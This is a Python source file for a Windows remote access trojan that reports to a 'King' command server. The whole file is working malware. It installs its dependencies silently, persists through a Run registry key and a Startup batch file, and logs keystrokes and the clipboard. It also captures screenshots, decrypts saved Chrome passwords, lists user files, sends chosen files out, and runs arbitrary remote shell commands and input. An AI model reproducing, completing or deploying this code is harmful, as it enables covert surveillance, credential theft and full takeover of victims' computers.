import argparse
import base64
import ctypes
import getpass
import importlib
import json
import os
import platform
import random
import shutil
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import uuid
import winreg

# Optional dependencies
try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    AES = None
    CRYPTO_AVAILABLE = False

try:
    from mss import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    pyautogui = None
    PYAUTOGUI_AVAILABLE = False

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    keyboard = None
    PYNPUT_AVAILABLE = False

try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except ImportError:
    pyperclip = None
    PYPERCLIP_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    psutil = None
    PSUTIL_AVAILABLE = False

REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
DRIVE_FIXED = 3
DRIVE_REMOVABLE = 2

keylog_active = False
keylog_data = ''
keylog_thread = None
clipboard_active = False
clipboard_thread = None
last_clipboard = ''


def silent_bootstrap():
    """Install required packages silently if missing."""
    for package in REQUIRED_PACKAGES:
        try:
            if package == 'pycryptodome':
                importlib.import_module('Crypto')
            elif package == 'Pillow':
                importlib.import_module('PIL')
            else:
                importlib.import_module(package)
        except ImportError:
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                subprocess.run(
                    [sys.executable, '-m', 'pip', 'install', package, '--quiet', '--no-warn-script-location'],
                    capture_output=True,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
            except Exception:
                pass


def get_hwid():
    """Return a hardware ID based on the MAC address."""
    return '-'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]).upper()


def get_arp_table():
    """Retrieve the Windows ARP table."""
    try:
        output = subprocess.check_output('arp -a', shell=True, stderr=subprocess.DEVNULL)
        return output.decode('utf-8', errors='ignore')
    except Exception as e:
        return f'Failed to get ARP table: {e}'


def send_atomic_data(s, type, data, filename):
    """Send data with the unified atomic sync protocol."""
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
        header = f"DATA_HEADER|{type}|{len(data)}|{filename}\n".encode('utf-8')
        s.sendall(header + data + b'V_PULSE_EOF')
        return True
    except Exception as e:
        print(f'[-] Atomic send failed: {e}')
        return False


def run_detached():
    """Restart this process in detached mode."""
    if platform.system() != 'Windows':
        return
    cmd = [sys.executable, sys.argv[0]] + sys.argv[1:] + ['--detached']
    subprocess.Popen(cmd, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
    sys.exit(0)


# Keylogger

def start_keylogger():
    """Start the keylogger thread."""
    global keylog_active, keylog_data, keylog_thread
    if not PYNPUT_AVAILABLE:
        return 'pynput not available'
    if keylog_active:
        return 'Keylogger already active'

    keylog_active = True
    keylog_data = ''

    def on_press(key):
        global keylog_data
        try:
            keylog_data += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                keylog_data += ' '
            elif key == keyboard.Key.enter:
                keylog_data += '\n'
            elif key == keyboard.Key.tab:
                keylog_data += '\t'
            else:
                keylog_data += f'[{key}]'

    listener = keyboard.Listener(on_press=on_press)
    keylog_thread = threading.Thread(target=listener.start, daemon=True)
    keylog_thread.start()
    return 'Keylogger started'


def stop_keylogger():
    """Stop the keylogger."""
    global keylog_active, keylog_thread
    keylog_active = False
    if keylog_thread:
        keylog_thread.join(timeout=1.0)
    return 'Keylogger stopped'


def get_keylog_bytes():
    """Return keylogger contents as bytes."""
    return keylog_data.encode('utf-8', errors='ignore')


# Clipboard monitor

def start_clipboard_monitor():
    """Start monitoring the clipboard."""
    global clipboard_active, clipboard_thread, last_clipboard
    if not PYPERCLIP_AVAILABLE:
        return 'pyperclip not available'
    if clipboard_active:
        return 'Clipboard monitor already active'

    clipboard_active = True
    last_clipboard = pyperclip.paste() if pyperclip else ''

    def monitor_clipboard():
        global last_clipboard
        while clipboard_active:
            try:
                current = pyperclip.paste()
                if current != last_clipboard:
                    last_clipboard = current
                    print(f'[*] Clipboard changed: {current[:100]}')
            except Exception:
                pass
            time.sleep(1)

    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()
    return 'Clipboard monitor started'


def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global clipboard_active, clipboard_thread
    clipboard_active = False
    if clipboard_thread:
        clipboard_thread.join(timeout=1.0)
    return 'Clipboard monitor stopped'


# Screenshot

def capture_desktop_screenshot(client):
    """Capture the desktop and send it back."""
    if not MSS_AVAILABLE or not PIL_AVAILABLE:
        try:
            client.sendall(b'DEPENDENCY_MISSING: mss Pillow')
        except Exception:
            pass
        return

    try:
        with mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            image = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            new_width = int(image.width * 0.7)
            new_height = int(image.height * 0.7)
            image = image.resize((new_width, new_height), Image.Resampling.LANCZOS)
            import io
            buffer = io.BytesIO()
            image.save(buffer, format='JPEG', quality=60, optimize=True)
            jpg_data = buffer.getvalue()
            client.sendall(b'IMG_FIXED\n')
            client.sendall(str(len(jpg_data)).zfill(10).encode('utf-8') + jpg_data + b'V_PULSE_EOF')
    except Exception as e:
        try:
            client.sendall(f'CAPTURE_FAILED: {e}'.encode('utf-8'))
        except Exception:
            pass


# Persistence

def ensure_service_continuity():
    """Ensure the agent is registered to run on startup."""
    try:
        app_data = os.getenv('APPDATA') or ''
        target_file = os.path.join(app_data, 'SystemUpdates', 'win_manager.py')
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        expected_value = f'pythonw "{target_file}"'
        try:
            current_value, _ = winreg.QueryValueEx(key, 'WinManager')
            if current_value != expected_value:
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
        except FileNotFoundError:
            winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
        winreg.CloseKey(key)
    except Exception:
        pass


def establish_persistence():
    """Copy this script to AppData and add persistence."""
    target_file = None
    try:
        app_data = os.getenv('APPDATA') or ''
        target_dir = os.path.join(app_data, 'SystemUpdates')
        os.makedirs(target_dir, exist_ok=True)
        target_file = os.path.join(target_dir, 'win_manager.py')
        if os.path.abspath(sys.argv[0]) != os.path.abspath(target_file):
            shutil.copy2(sys.argv[0], target_file)
        startup_folder = os.path.join(os.getenv('USERPROFILE') or '', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_folder, 'ServiceUpdate.bat')
        if not os.path.exists(bat_path):
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(f'@echo off\npythonw "{target_file}"')
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
        winreg.CloseKey(key)
    except Exception:
        pass
    return target_file


def check_persistence(target_file):
    """Periodically verify persistence is still present."""
    while True:
        try:
            if not target_file:
                time.sleep(300)
                continue
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            value, _ = winreg.QueryValueEx(key, 'WinManager')
            winreg.CloseKey(key)
            expected = f'pythonw "{target_file}"'
            if value != expected:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected)
                winreg.CloseKey(key)
        except Exception:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
                winreg.CloseKey(key)
            except Exception:
                pass
        time.sleep(300)


# Exploration

def list_dirs(path, depth=0, max_depth=3):
    """List directories recursively up to max_depth."""
    result = []
    if depth >= max_depth:
        return result
    try:
        for item in os.listdir(path):
            full = os.path.join(path, item)
            if os.path.isdir(full):
                result.append(full)
                result.extend(list_dirs(full, depth + 1, max_depth))
    except (PermissionError, OSError):
        pass
    return result


def explore_drives():
    """Discover fixed and removable drives."""
    kernel32 = ctypes.windll.kernel32
    get_drive_type = kernel32.GetDriveTypeW
    drives = {}
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        root = f'{letter}:\\'
        if os.path.exists(root):
            type_code = get_drive_type(root)
            if type_code == DRIVE_FIXED:
                type_str = 'system' if letter == 'C' else 'secondary'
            elif type_code == DRIVE_REMOVABLE:
                type_str = 'mobile'
            else:
                continue
            drives[letter] = {'type': type_str, 'dirs': list_dirs(root, max_depth=2)}
    return drives


def harvest_user():
    """Collect paths from user directories."""
    userprofile = os.getenv('USERPROFILE') or ''
    targets = ['Documents', 'Desktop', 'Downloads']
    result = {}
    for target in targets:
        path = os.path.join(userprofile, target)
        if os.path.exists(path):
            result[target] = []
            for root, _, files in os.walk(path):
                for filename in files:
                    result[target].append(os.path.join(root, filename))
    return result


# Utilities

def get_username():
    """Return the current username."""
    try:
        return os.getlogin()
    except OSError:
        return getpass.getuser()


def report_status():
    """Report system status."""
    report = {
        'HWID': get_hwid(),
        'OS': platform.system(),
        'Version': platform.version(),
        'Hostname': socket.gethostname(),
        'User': get_username(),
        'Python': platform.python_version(),
    }
    if PSUTIL_AVAILABLE:
        try:
            report['Uptime'] = f'{time.time() - psutil.boot_time():.2f}s'
            report['CPU'] = f'{psutil.cpu_percent(interval=0.2)}%'
            report['Memory'] = f'{psutil.virtual_memory().percent}%'
        except Exception:
            report['Uptime'] = 'N/A'
    else:
        report['Uptime'] = 'N/A'
    return json.dumps(report)


def decrypt_dpapi(encrypted_bytes):
    """Decrypt DPAPI-protected bytes."""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.c_uint32), ('pbData', ctypes.POINTER(ctypes.c_char))]

    data_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
    data_out = DATA_BLOB()

    ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
        ctypes.POINTER(DATA_BLOB), ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(DATA_BLOB)
    ]

    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)):
        decrypted = ctypes.string_at(data_out.pbData, data_out.cbData)
        ctypes.windll.kernel32.LocalFree(data_out.pbData)
        return decrypted
    return None


def extract_chrome_credentials():
    """Extract Chrome credentials using local_state and DPAPI."""
    user_profile = os.getenv('USERPROFILE') or ''
    chrome_base = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    login_data_path = os.path.join(chrome_base, 'Default', 'Login Data')
    local_state_path = os.path.join(chrome_base, 'Local State')

    if not os.path.exists(login_data_path) or not os.path.exists(local_state_path):
        return b'Error: Chrome Login Data not found'

    try:
        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        master_key = decrypt_dpapi(encrypted_key)
        if not master_key:
            return b'Error: DPAPI master key decryption failed'

        temp_dir = os.getenv('TEMP') or os.getcwd()
        temp_copy = os.path.join(temp_dir, f'chrome_login_{uuid.uuid4().hex}.db')
        shutil.copy2(login_data_path, temp_copy)

        conn = sqlite3.connect(temp_copy)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

        output = []
        for url, user, enc_pass in cursor.fetchall():
            if not enc_pass:
                continue
            
            try:
                # Case 1: Modern Chrome (v10 / v11 / v20)
                if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
                    nonce = enc_pass[3:15]
                    payload = enc_pass[15:]
                    cipher_text = payload[:-16]
                    tag = payload[-16:]
                    
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                    password = cipher.decrypt_and_verify(cipher_text, tag).decode(errors='ignore')
                
                # Case 2: Legacy / Different Prefix
                else:
                    # Attempt direct decryption if prefix is missing but data is encrypted
                    try:
                        # Some systems use a 12-byte nonce without a 3-byte prefix
                        nonce = enc_pass[:12]
                        payload = enc_pass[12:]
                        cipher_text = payload[:-16]
                        tag = payload[-16:]
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                        password = cipher.decrypt_and_verify(cipher_text, tag).decode(errors='ignore')
                    except Exception:
                        password = "Decryption Failed (Unknown Format)"

                if password and len(password) > 0:
                    output.append(f"URL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")
                
            except Exception:
                continue
            
        conn.close()
        if os.path.exists(temp_copy):
            os.remove(temp_copy)
        
        # If output is still empty, let's see if there are ANY logins at all
        if not output:
            return b"No encrypted passwords found, but the database was accessed."
                
        return "\n".join(output).encode()
    except Exception as e:
        return f'Error: {e}'.encode('utf-8')



def extract_file_bytes(path):
    """Read a file and return bytes for exfiltration."""
    if not os.path.isfile(path):
        return None
    try:
        with open(path, 'rb') as f:
            return f.read()
    except Exception:
        return None


def connect_to_hub(hub_ip, port):
    """Connect to the hub and process commands."""
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10.0)
        try:
            print(f'[*] Attempting to reach King at {hub_ip}:{port}...')
            client.connect((hub_ip, port))
            print('[*] Connected to King.')
            while True:
                try:
                    data = client.recv(4096).decode('utf-8', errors='ignore')
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    print('[-] Connection reset by hub.')
                    break

                if not data:
                    print('[-] Hub closed the connection.')
                    break

                for message in data.strip().splitlines():
                    command = message.strip()
                    if not command:
                        continue

                    if command == 'STATUS_REPORT':
                        client.sendall(f'STATUS:{report_status()}\n'.encode('utf-8'))
                    elif command == 'DESKTOP_CAPTURE':
                        capture_desktop_screenshot(client)
                    elif command == 'ENSURE_SERVICE_CONTINUITY':
                        ensure_service_continuity()
                        client.sendall(b'SERVICE_CONTINUITY_OK\n')
                    elif command == 'SHUTDOWN_NODE':
                        print('[*] Shutdown command received.')
                        return
                    elif command == 'PING':
                        client.sendall(b'PING_OK\n')
                    elif command.startswith('MESSAGE '):
                        message_text = command[8:].strip('"')
                        try:
                            ctypes.windll.user32.MessageBoxW(0, message_text, 'Message from King', 0x40)
                        except Exception:
                            pass
                    elif command.startswith('SHELL '):
                        shell_cmd = command[6:].strip('"')
                        try:
                            result = subprocess.check_output(shell_cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                            output = result.decode('utf-8', errors='ignore').strip()
                            send_atomic_data(client, 'SHELL', output.encode('utf-8'), 'shell_output.txt')
                        except subprocess.TimeoutExpired:
                            send_atomic_data(client, 'SHELL', b'Command timed out after 30 seconds', 'shell_error.txt')
                        except subprocess.CalledProcessError as e:
                            message = f'Exit code {e.returncode}: {e.output.decode("utf-8", errors="ignore").strip()}'
                            send_atomic_data(client, 'SHELL', message.encode('utf-8'), 'shell_error.txt')
                        except Exception as e:
                            send_atomic_data(client, 'SHELL', f'Error: {e}'.encode('utf-8'), 'shell_error.txt')
                    elif command == 'KILL_AGENT':
                        try:
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                            winreg.DeleteValue(key, 'WinManager')
                            winreg.CloseKey(key)
                        except Exception:
                            pass
                        try:
                            startup_folder = os.path.join(os.getenv('USERPROFILE') or '', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                            bat_path = os.path.join(startup_folder, 'ServiceUpdate.bat')
                            if os.path.exists(bat_path):
                                os.remove(bat_path)
                        except Exception:
                            pass
                        try:
                            target_file = os.path.join(os.getenv('APPDATA') or '', 'SystemUpdates', 'win_manager.py')
                            if os.path.exists(target_file):
                                os.remove(target_file)
                        except Exception:
                            pass
                        return
                    elif command == 'EXPLORE_DRIVES':
                        send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json')
                    elif command == 'HARVEST_USER':
                        send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json')
                    elif command == 'NETWORK_TOPOLOGY':
                        send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt')
                    elif command == 'EXTRACT_CREDENTIALS':
                        send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt')
                    elif command == 'GET_KEYS':
                        if not PYNPUT_AVAILABLE:
                            client.sendall(b'DEPENDENCY_MISSING: pynput\n')
                        else:
                            send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt')
                    elif command.startswith('EXTRACT_FILE '):
                        file_path = command[13:].strip('"')
                        payload = extract_file_bytes(file_path)
                        if payload is None:
                            send_atomic_data(client, 'FILE', f'Error: could not read {file_path}'.encode('utf-8'), os.path.basename(file_path) or 'unknown.txt')
                        else:
                            send_atomic_data(client, 'FILE', payload, os.path.basename(file_path))
                    elif command.startswith('KEYLOG'):
                        if not PYNPUT_AVAILABLE:
                            client.sendall(b'DEPENDENCY_MISSING: pynput\n')
                        elif 'START' in command.upper():
                            client.sendall(f'KEYLOG_RESULT: {start_keylogger()}\n'.encode('utf-8'))
                        elif 'STOP' in command.upper():
                            client.sendall(f'KEYLOG_RESULT: {stop_keylogger()}\n'.encode('utf-8'))
                        else:
                            client.sendall(b'KEYLOG_RESULT: Use KEYLOG START or KEYLOG STOP\n')
                    elif command.startswith('CLIPBOARD'):
                        if not PYPERCLIP_AVAILABLE:
                            client.sendall(b'DEPENDENCY_MISSING: pyperclip\n')
                        elif 'START' in command.upper():
                            client.sendall(f'CLIPBOARD_RESULT: {start_clipboard_monitor()}\n'.encode('utf-8'))
                        elif 'STOP' in command.upper():
                            client.sendall(f'CLIPBOARD_RESULT: {stop_clipboard_monitor()}\n'.encode('utf-8'))
                        else:
                            client.sendall(b'CLIPBOARD_RESULT: Use CLIPBOARD START or CLIPBOARD STOP\n')
                    elif command.startswith('CLICK '):
                        if not PYAUTOGUI_AVAILABLE:
                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
                        else:
                            try:
                                parts = command.split()
                                x = int(parts[1])
                                y = int(parts[2])
                                pyautogui.click(x, y)
                            except Exception:
                                pass
                    elif command.startswith('TYPE '):
                        if not PYAUTOGUI_AVAILABLE:
                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
                        else:
                            try:
                                text = command[5:].strip('"')
                                pyautogui.typewrite(text)
                            except Exception:
                                pass
                    else:
                        pass
        except ConnectionResetError:
            print('[-] Connection reset while listening to hub.')
        except socket.error as e:
            print(f'[-] Socket error: {e}')
        except Exception as exc:
            print(f'[-] Unexpected error: {exc}')
        finally:
            try:
                client.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            client.close()

        delay = random.randint(5, 15)
        print(f'[*] Retrying in {delay} seconds...')
        time.sleep(delay)


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', '192.168.100.9'), help='IP address of the King command hub')
    parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', '9999')), help='Port of the King command hub')
    parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
    parser.add_argument('--detached', action='store_true', help='Run in background')
    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()
    silent_bootstrap()
    if not args.detached:
        run_detached()
    if not args.no_persist:
        target_file = establish_persistence()
        threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
        ensure_service_continuity()
    print('\n============================================================')
    print(' Agent Node Client')
    print('------------------------------------------------------------')
    print(f'Hub IP:    {args.hub_ip}')
    print(f'Hub Port:  {args.hub_port}')
    print(f'Python:    {platform.python_version()}')
    print(f'Platform:  {platform.system()} {platform.release()}')
    print(f'MSS:       {"available" if MSS_AVAILABLE else "missing"}')
    print(f'PIL:       {"available" if PIL_AVAILABLE else "missing"}')
    print('============================================================\n')
    if args.hub_ip == '192.168.100.9':
        print('[*] WARNING: Using default HUB_IP 192.168.100.9. Update --hub-ip if King is on a different machine.')
    print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
    connect_to_hub(args.hub_ip, args.hub_port)
